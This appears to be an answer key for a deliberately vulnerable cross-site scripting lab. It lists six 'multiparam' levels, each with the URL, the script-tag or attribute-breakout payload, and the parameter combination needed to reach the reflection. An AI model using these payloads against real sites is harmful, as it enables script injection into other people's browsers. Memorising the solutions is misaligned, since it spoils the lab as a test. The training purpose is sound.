# multiparam — solutions

Multiple parameters; requires correct param combination to reach the reflection.

### multiparam-level1

`/multiparam/level1/?q1=%3Cscript%3Ealert(1)%3C/script%3E&q2=b`

- payload: `<script>alert(1)</script>`
- context: both q1, q2 raw — pick either

### multiparam-level2

`/multiparam/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E&page=1`

- payload: `<script>alert(1)</script>`
- context: requires `page` param present to reach reflection

### multiparam-level3

`/multiparam/level3/?search=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&sort=b`

- payload: `"><script>alert(1)</script>`
- context: input value attribute breakout

### multiparam-level4

`/multiparam/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E&token=valid`

- payload: `<script>alert(1)</script>`
- context: requires token=valid gate

### multiparam-level5

`/multiparam/level5/?prefix=a&name=%3Cscript%3Ealert(1)%3C/script%3E&suffix=c`

- payload: `<script>alert(1)</script>` in name
- context: only `name` raw; prefix/suffix encoded

### multiparam-level6

`/multiparam/level6/?a=%3Cscript%3Ealert(1)%3C/script%3E&b=y&c=z`

- payload: `<script>alert(1)</script>` in `a`
- context: a→body raw (also `b="...>...`, `c='-alert(1)-'`)
